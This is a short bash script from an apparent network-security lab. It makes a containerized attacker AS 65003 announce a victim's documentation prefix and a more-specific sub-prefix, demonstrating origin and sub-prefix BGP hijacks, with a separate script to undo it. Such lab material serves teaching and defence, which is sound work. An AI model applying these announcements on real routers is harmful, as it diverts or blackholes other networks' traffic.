#!/usr/bin/env bash
# Inject the hijack live: AS 65003 (attacker) starts announcing the victim's exact
# prefix (origin hijack) and a more-specific sub-prefix (sub-prefix hijack).
# Idempotent and reversible with stop-hijack.sh. The page runs the same commands as
# three scenarios (exact prefix only, sub-prefix only, both); this script is "both".
set -euo pipefail

docker exec lab-attacker vtysh \
  -c "configure terminal" \
  -c "ip route 203.0.113.0/24 Null0" \
  -c "ip route 203.0.113.0/25 Null0" \
  -c "router bgp 65003" \
  -c "address-family ipv4 unicast" \
  -c "network 203.0.113.0/24" \
  -c "network 203.0.113.0/25" \
  -c "end"

echo "hijack injected: 65003 now announces 203.0.113.0/24 (exact) and 203.0.113.0/25 (sub-prefix)"
